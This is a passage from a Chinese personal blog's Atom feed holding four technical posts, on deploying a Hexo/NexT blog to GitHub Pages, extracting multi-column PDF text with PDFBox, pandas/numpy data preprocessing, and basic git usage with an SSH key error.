      <category term="闲言碎语" scheme="http://yoursite.com/categories/%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD/"/>
    
    
  </entry>
  
  <entry>
    <title>使用hexo+github+Next搭建个人博客网站</title>
    <link href="http://yoursite.com/2019/05/14/hexo-next-blog/"/>
    <id>http://yoursite.com/2019/05/14/hexo-next-blog/</id>
    <published>2019-05-14T11:30:20.000Z</published>
    <updated>2019-05-16T02:57:33.208Z</updated>
    
    <content type="html"><![CDATA[<p>最近做毕业设计做的有点累，好久没写博客了，写篇博客放松一下。最近面临毕业了，之前在腾讯云搭建的个人站点，服务器也不能使用学生优惠的价格购买了，遂在今天借这个机会把博客迁移到github上来。之前有一次自己的云服务器的数据库被撞库了，又没有备份，丢失了很多的文章，也是心痛。使用hexo部署到github上就很好的避免了这个问题。整体上来说，hexo和Next的文档也是很丰富详细的，下面记录一下搭建部署的一些细节问题。</p><p>注：使用hexo搭建博客就意味着你今后就要使用 Markdown 来写作了。Markdown的通用语法很简单，可以将其认为是html的一种变体（实际上就是html的变体，因此可以在Markdown文件中使用部分html标签）。Markdown的语法一般来说半个小时不到就能学会了（<a href="https://www.markdownguide.org/basic-syntax" target="_blank" rel="noopener">makrdown basic-syntax</a>），只要用Markdown写上两篇文章，基本上就得心应手了。这里顺带着推荐一个编辑器 Typora，无论是macOS还是Windows下该软件的表现都不错，而且对于 LaTeX 和 Code支持的比较好（这个是我推荐Typora的重点）。</p><h2 id="一、本地搭建hexo和Next"><a href="#一、本地搭建hexo和Next" class="headerlink" title="一、本地搭建hexo和Next"></a>一、本地搭建hexo和Next</h2><p>现在hexo的官方文档已经很完善了，并且也支持多种语言，一般来说都没什么大的问题。我参考着<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">hexo的官方文档</a>基本上就把hexo搭建好了。这里我想说一下，能参考官方文档就尽量看官方文档，现在网上很多的博客文章时间发表的都有些时段了，而官网文档是系统运行的最基本的参考。把hexo搭建好之后就可以在某个空白文件夹下初始化hexo项目。我相信大家到这里应该都没什么问题。</p><p><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">hexo官方文档</a></p><p><a href="https://theme-next.iissnan.com/getting-started.html" target="_blank" rel="noopener">Next官方文档</a></p><p><strong>下面是配置环节。</strong></p><blockquote><p>在 Hexo 中有两份主要的配置文件，其名称都是 _config.yml。 其中，一份位于站点根目录下，主要包含 Hexo 本身的配置；另一份位于主题目录下，这份配置由主题作者提供，主要用于配置主题相关的选项。</p></blockquote><p>上面这段话是Next网站的一句话。配置的时候一定要注意这两个文件，文件名都是一样的，别弄混淆了，可以这样理解：</p><ul><li>根目录下的_config.yml是全局的变量设置，就是无论更换什么主题，这一块的内容是不变的。</li><li>themes文件夹里的主题目录下的_config.yml文件中配置的是该主题所特有的个性化设置。</li></ul><p>结合上面两个官方文档基本上就能把站点配个七七八八了，然后有几个小的细节说一下。</p><p><strong>1、Next添加博客的更新时间</strong></p><p>现在网上有很多文章是在原有的swig文件中添加一些dom标签，实际上我现在使用的是 Next 5.1.4版本，其中就已经包含了博客更新时间的选项。只需要在主题配置文件_config.yml搜索update选项，在post_meta选项中应该可以找到一项updated_at，将其设置为true即可。（题外话，其实很多设置，小伙伴们可以先在该文件中搜索一下，比如评论相关的配置，就搜索一下comment，如果有的话就不用到处查资料了。）</p><p><strong>2、hexo新增页面</strong><br>比如说我要自定义一个页面project放在menu中，方法和<a href="https://theme-next.iissnan.com/theme-settings.html#tags-page" target="_blank" rel="noopener">官网给出的tags、categories建立页面</a>是一样的，只不过就是index.md文件中没有type这个选项，tags和categories页面的功能都是给提供好的。比如我要新建一个页面project来写我的近期工作。就可以使用来新建一个页面，这个页面和新建一个文章还不是一样的。内容的组织结构可以是一样的。这个时候在source文件夹下面就有一个名为project的目录，下有一个index.md的文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page &quot;project&quot;</span><br></pre></td></tr></table></figure></p><p><strong>3、Next添加多个分类目录</strong><br>这个看一下<a href="http://aiellochan.com/2018/02/13/hexo/Hexo-%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%A4%9A%E4%B8%AA-categories/" target="_blank" rel="noopener">aiellochan</a>写的这篇文章。<br>注意区分子分类和多个分类的区别。</p><p><strong>子分类</strong>，下面的分类配置会将该文章放到 Sports/Baseball 这个分类下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">categories:</span><br><span class="line">  - Sports</span><br><span class="line">  - Baseball</span><br></pre></td></tr></table></figure></p><p>同样的作用还可以这样写：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">categories: [Sports,Baseball]</span><br></pre></td></tr></table></figure></p><p>上面两种写法最终的效果都是一样的，都是将文章放在了一个子分类目录下。</p><p><strong>多个分类</strong>,如果我们的要求是将文章同时分到两个或者多个不同的类目下呢？官方给出的方法是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">categories:</span><br><span class="line">  - [Sports]</span><br><span class="line">  - [Baseball]</span><br></pre></td></tr></table></figure></p><p>只需要用中括号将独立的分类括起来即可，这样上面的文章就会被分类在 Sports 和 Baseball 这两个不同的目录中了。</p><h2 id="二、将该博客发布到github上去"><a href="#二、将该博客发布到github上去" class="headerlink" title="二、将该博客发布到github上去"></a>二、将该博客发布到github上去</h2><p><strong>1、建立一个repo</strong><br>名称为xxxx.github.io，这样就可以使用xxxx.github.io这个域名来访问你的站点了。</p><p><strong>2、部署</strong><br>在根目录下的_config.yml文件中有一个配置项deploy，在里面配置上上面这个库的地址。如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/deployment.html</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https://github.com/yyyy/xxxx.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure></p><p>注意这里，这里的branch要用master分支，这样你的站点才能成为一个Github Page，官网这一块写的是建议是用public作为部署的分支，但是这样将branch配置为非master分支后，站点是访问不到的。<a href="https://hexo.io/zh-cn/docs/deployment" target="_blank" rel="noopener">官方上部署部分的其他方面</a>写的还是很清晰的。</p><p>配置完毕后，使用<code>hexo clean</code>和<code>hexo deploy</code>命令就可以把站点部署到github上了。等待几分钟就可以访问了。</p><h2 id="三、站点主题更新的问题"><a href="#三、站点主题更新的问题" class="headerlink" title="三、站点主题更新的问题"></a>三、站点主题更新的问题</h2><p>当站点部署完毕后，加入主题的部分地方有更改，那么该怎么同步到github上呢。<br>其实也很简单，对有改动的页面重新生成新的页面，然后再推送到github库。这里有没有感觉到其实就是github的git。使用<code>hexo generate -d</code>或者<code>hexo g -d</code>即可将更新后的站点提交到github上。（发布文章用这两条命令就行。）</p><p><strong>注意哦</strong><br>这里有个cache的问题，可能大家会发现为什么已经重新部署了刷新页面还是没有改变，其实这是因为浏览器缓存的原因，只需要清除浏览器最近的cache就可以了。（可能是因为是静态的网站，所以cache缓存的较多？）</p><h2 id="四、在文章中嵌入可视化图表"><a href="#四、在文章中嵌入可视化图表" class="headerlink" title="四、在文章中嵌入可视化图表"></a>四、在文章中嵌入可视化图表</h2><p>下图是d3的一个柱状图demo，可以实现增加或删除的操作。怎么做呢？实际上只需要在你的文章中嵌入JavaScript脚本的代码即可，前文说到了 Markdown就是html的变体，因此它也支持在文章中直接加上各类dom标签。</p><p>下面是嵌入的代码示例和图表类型<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"bar"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/css/custom/main.css"</span>&gt;</span><br><span class="line">&lt;script src=<span class="string">"/js/src/d3.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;script src=<span class="string">"/js/custom/bar.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p><div id="bar"></div></p><p><link rel="stylesheet" href="/css/custom/main.css"></p><script src="/js/src/d3.min.js"></script><script src="/js/custom/bar.js"></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近做毕业设计做的有点累，好久没写博客了，写篇博客放松一下。最近面临毕业了，之前在腾讯云搭建的个人站点，服务器也不能使用学生优惠的价格购买了，遂在今天借这个机会把博客迁移到github上来。之前有一次自己的云服务器的数据库被撞库了，又没有备份，丢失了很多的文章，也是心痛。使
      
    
    </summary>
    
      <category term="开发环境" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
    
    
      <category term="hexo" scheme="http://yoursite.com/tags/hexo/"/>
    
      <category term="Next" scheme="http://yoursite.com/tags/Next/"/>
    
  </entry>
  
  <entry>
    <title>如何使用PDFbox抽取分列的PDF页面</title>
    <link href="http://yoursite.com/2019/05/07/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8PDFbox%E6%8A%BD%E5%8F%96%E5%88%86%E5%88%97%E7%9A%84PDF%E9%A1%B5%E9%9D%A2/"/>
    <id>http://yoursite.com/2019/05/07/如何使用PDFbox抽取分列的PDF页面/</id>
    <published>2019-05-07T08:32:17.000Z</published>
    <updated>2020-01-02T01:15:38.840Z</updated>
    
    <content type="html"><![CDATA[<p>在尝试抽取PDF文档的内容时，了解到了Java下面有个PDFbox的工具包，整体使用的效果还是不错的。在解决本文的主要问题前，先了解一下PDF这种半结构化的文档。</p><p><strong>PDF Structure</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">|----------------------------+</span><br><span class="line">| --------------------------|</span><br><span class="line">| |        Header        | |  &lt;-----文件头，表示版本.%PDF-<span class="number">1</span>.M</span><br><span class="line">| |                      | |</span><br><span class="line">| --------------------------|</span><br><span class="line">| |                      | |</span><br><span class="line">| |         Body         | |  &lt;-----文件体，由一系列PDF对象组成</span><br><span class="line">| |                      | |</span><br><span class="line">| |                      | |</span><br><span class="line">| --------------------------|</span><br><span class="line">| |    Cross-reference   | |  &lt;-----交叉引用表，包含指向所有间接</span><br><span class="line">| |         table        | |        对象的文件位置索引的列表</span><br><span class="line">| |        (xref)        | |</span><br><span class="line">| --------------------------|</span><br><span class="line">| |        Trailer       | |  &lt;-----包含文件的根节点信息和</span><br><span class="line">| |                      | |        文件解析的起点信息</span><br><span class="line">| --------------------------|</span><br><span class="line">+----------------------------+</span><br></pre></td></tr></table></figure><p>本文主要解决的问题是针对有两列或者多列的页面，提取其中的文字。这一点根据 @mkl的提示，实现了基本的demo。<br>在Stack Overflow上有一个也是关于PDF文档多列抽取的问题，PDF文档的处理是一项复杂的工程，现在还尚未有非常成熟的一套解决方案。Java平台上的开源工具 PDFbox和商业服务iText相对而言做的比较完整，但对于的文档还需要定义额外的提取规则。这里是 stackoverflow 下的问题及 @mkl 的回答。<a href="https://stackoverflow.com/questions/26233387/extract-pdf-text-by-columns" target="_blank" rel="noopener">extract PDF text by columns</a></p><blockquote><p>PDFBox does not analyze the page content to recognize columns. If you do the analysis, though, it allows you to extract text column by column if you provide the column rectangles as reguions.</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">StringBuilder pdfText = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"><span class="comment">// 重写 writeString(String, List&lt;TextPosition&gt;)方法以加载更多文本的信息，</span></span><br><span class="line"><span class="comment">// 增加使用字体的名称来扩展文本信息</span></span><br><span class="line">PDFTextStripperByArea stripper = <span class="keyword">new</span> PDFTextStripperByArea()；</span><br><span class="line"></span><br><span class="line">stripper.setSortByPosition(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 定位到左边一栏的页面</span></span><br><span class="line">Rectangle rectLeft = <span class="keyword">new</span> Rectangle(<span class="number">10</span>, <span class="number">60</span>, <span class="number">320</span>, <span class="number">820</span>);</span><br><span class="line"><span class="comment">// 定位到右边一栏的页面</span></span><br><span class="line">Rectangle rectRight = <span class="keyword">new</span> Rectangle(<span class="number">330</span>, <span class="number">60</span>, <span class="number">320</span>, <span class="number">820</span>);</span><br><span class="line"></span><br><span class="line">stripper.addRegion(<span class="string">"leftColumn"</span>, rectLeft);</span><br><span class="line"></span><br><span class="line">stripper.addRegion(<span class="string">"rightColumn"</span>, rectRight);</span><br><span class="line"></span><br><span class="line">PDPageTree allPages = document.getDocumentCatalog().getPages();</span><br><span class="line"><span class="keyword">int</span> pageNumber = document.getNumberOfPages();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">String leftText = <span class="string">""</span>;</span><br><span class="line">String rightText = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pageNumber; i++) &#123;</span><br><span class="line"></span><br><span class="line">    PDPage page = (PDPage) allPages.get(i);</span><br><span class="line"></span><br><span class="line">    stripper.extractRegions(page);</span><br><span class="line">    leftText = stripper.getTextForRegion(<span class="string">"leftColumn"</span>);</span><br><span class="line">    rightText = stripper.getTextForRegion(<span class="string">"rightColumn"</span>);</span><br><span class="line"></span><br><span class="line">    pdfText.append(leftText);</span><br><span class="line">    pdfText.append(rightText);</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">"Page number "</span>+ i);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中这里的列的边界，是不断尝试获取的。</p><p>在做毕业设计的时候，看到一篇关于 寻找PDF文档区域边界的方法。论文题目是 Improving the Extraction of Text in PDFs by Simulating the Human Reading Order。通篇读下来，感觉这种方法还是很可靠地，近期会对论文中提到的算法进行复现。</p><hr><p>很多同学对于上面代码中的 PDFTextStripperByArea类的重写比较感兴趣，我在这里贴一下代码吧。这里主要实现的是 把抽取出来的文本根据字体以及字号的不同打上标签，便于内容的提取。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PDFTextStripper stripper = <span class="keyword">new</span> PDFTextStripper() &#123;</span><br><span class="line"></span><br><span class="line">    String prevBaseFont = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">float</span> prevFontSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">writeString</span><span class="params">(String text, List&lt;TextPosition&gt; textPositions)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        StringBuilder builder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (TextPosition position : textPositions) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获得该区域文本的字体名以及字体大小，根据这两点进行抽取</span></span><br><span class="line">            <span class="keyword">float</span> fontSize = position.getFontSize();</span><br><span class="line"></span><br><span class="line">            String baseFont = position.getFont().getName();</span><br><span class="line">            <span class="keyword">if</span> (baseFont != <span class="keyword">null</span> &amp;&amp; !baseFont.equals(prevBaseFont) &amp;&amp; !(fontSize==prevFontSize)) &#123;</span><br><span class="line"></span><br><span class="line">                builder.append(<span class="string">'['</span>).append(baseFont).append(<span class="string">'|'</span>).append(fontSize).append(<span class="string">']'</span>);</span><br><span class="line">                prevBaseFont = baseFont;</span><br><span class="line">                prevFontSize = fontSize;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            builder.append(position.getUnicode());</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        writeString(builder.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在尝试抽取PDF文档的内容时，了解到了Java下面有个PDFbox的工具包，整体使用的效果还是不错的。在解决本文的主要问题前，先了解一下PDF这种半结构化的文档。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PDF Structure&lt;/strong&gt;&lt;/p&gt;
&lt;figure class
      
    
    </summary>
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="PDFbox" scheme="http://yoursite.com/tags/PDFbox/"/>
    
  </entry>
  
  <entry>
    <title>通过 Tipdm 的数据处理获得的数据预处理的一些个方法及流程。</title>
    <link href="http://yoursite.com/2019/04/16/%E9%80%9A%E8%BF%87%20Tipdm%20%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E8%8E%B7%E5%BE%97%E7%9A%84%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%AA%E6%96%B9%E6%B3%95%E5%8F%8A%E6%B5%81%E7%A8%8B/"/>
    <id>http://yoursite.com/2019/04/16/通过 Tipdm 的数据处理获得的数据预处理的一些个方法及流程/</id>
    <published>2019-04-16T12:31:04.000Z</published>
    <updated>2019-12-10T14:36:13.146Z</updated>
    
    <content type="html"><![CDATA[<p><strong>对时间序列的处理</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 pands 的 to_datetime 方法，可以将字符类型的时间字段转换为时间字段</span></span><br><span class="line">vehicle[<span class="string">'location_time'</span>] = pd.to_datetime(vehicle[<span class="string">'location_time'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将时间字段补点，按照 1s 的频度</span></span><br><span class="line">grouper = pd.Grouper(key=<span class="string">'location_time'</span>, freq=<span class="string">'1s'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 reset_index() 重新建立 dataframe 的索引</span></span><br><span class="line">res = vehicle.groupby(grouper).first().reset_index()</span><br></pre></td></tr></table></figure></p><p><strong>NAN值的处理</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将 dataframe中的 "lng","lat","gps_speed" 三列转换为 二维的 numpy 数组</span></span><br><span class="line">lng_lat = res[[<span class="string">"lng"</span>,<span class="string">"lat"</span>,<span class="string">"gps_speed"</span>]].values</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 np.isnan 函数判断该数组中为值为 NAN 的项，并返回一个 True/False 形成的数组</span></span><br><span class="line">isnull_state = np.isnan(lng_lat)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 np.where 函数找到 isnull_state 中为True的索引（行号和列号），通常和 np.isnan 联合使用</span></span><br><span class="line">nan_index = np.array(sorted(list(set(np.where(isnull_state)[<span class="number">0</span>]))))</span><br></pre></td></tr></table></figure></p><p><strong>pandas中行列索引</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 对于一个DataFrame A，A.loc[k]是读取A中index为k的那一行。A.iloc[k]是读取A中的第k行。</span></span><br><span class="line">lng = np.array([test_vehicle.loc[i][<span class="string">"lng"</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2500</span>,<span class="number">2700</span>)])</span><br></pre></td></tr></table></figure></p><p><strong>numpy数组的初始化及删除</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化一个二维的数组，并赋值为0，现在未找到可以直接创建一个空的二维数组的方法</span></span><br><span class="line">all_point_distance = np.array([[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]])</span><br><span class="line"><span class="comment"># 再通过 np.delete 函数删除第一行。多说一句，axis=0 是对行操作，axis=1 是对列进行操作</span></span><br><span class="line">all_point_distance = np.delete(all_point_distance,<span class="number">0</span>,axis=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 之所以这样做，是因为有数组合并的需求。如下，这样就可以把同样是二维数组的 distance 中的元素添加到 all_point_distance</span></span><br><span class="line">all_point_distance = np.concatenate((all_point_distance,distance))</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;对时间序列的处理&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span cla
      
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
      <category term="数据处理" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/"/>
    
      <category term="pandas" scheme="http://yoursite.com/tags/pandas/"/>
    
  </entry>
  
  <entry>
    <title>git使用总结</title>
    <link href="http://yoursite.com/2019/03/20/git%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/03/20/git使用总结/</id>
    <published>2019-03-20T03:25:43.000Z</published>
    <updated>2020-01-02T01:17:12.339Z</updated>
    
    <content type="html"><![CDATA[<p>本篇文章记录一下使用git中遇见的问题及解决方法。</p><p>有两种方式来上传到GitHub上：<br>1、使用开发工具自带的版本控制插件<br>比如 webstorm自带的版本控制。这个首先在 File-&gt;Setting-&gt;GitHub, 在里面输入Host、账号和密码即可。git注意配置一下本机的git路径。</p><p><img src="https://www.getyo.cn/wp-content/uploads/2019/03/webstormSetting.jpg" alt></p><p>File-&gt;Setting-&gt;Version Control-&gt;GitHub</p><p>2、 在控制台中使用git进行版本控制<br>git init（初始化项目）<br>git add filename.xxx (这里是文件，文件夹的话需要在add后面加上-f)<br>git commit “some words to describe this modification”<br>git push -u origin master (这里是指上传到当前的master分支)  </p><p>创建一个初始的仓库后会有怎么上传代码的提示，这里就不再赘述。<br>还有一个问题如下：</p><p>在push的过程中，出现了这个错误。<br><a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>: Permission denied (publickey). fatal: Could not read from remote repository.<br>这是因为在创建完本地的ssh私钥之后，GitHub那边的服务器并没有连接你的钥匙，这样两者是无法进行通信的，因此在使用ssh-kengen船舰私钥之后还要把私钥的内容加入到你的GitHub账号里。在GitHub上具体的描述。<br>解决链接：<br><a href="https://help.github.com/en/articles/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent" target="_blank" rel="noopener">https://help.github.com/en/articles/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent</a></p><p>另附上git的官网学习链接： <a href="https://git-scm.com/book/zh/v2/" target="_blank" rel="noopener">https://git-scm.com/book/zh/v2/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本篇文章记录一下使用git中遇见的问题及解决方法。&lt;/p&gt;
&lt;p&gt;有两种方式来上传到GitHub上：&lt;br&gt;1、使用开发工具自带的版本控制插件&lt;br&gt;比如 webstorm自带的版本控制。这个首先在 File-&amp;gt;Setting-&amp;gt;GitHub, 在里面输入Hos
      
    
    </summary>
    
      <category term="自然语言处理" scheme="http://yoursite.com/categories/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86/"/>
    
    
      <category term="nlp" scheme="http://yoursite.com/tags/nlp/"/>
    
  </entry>
  
</feed>
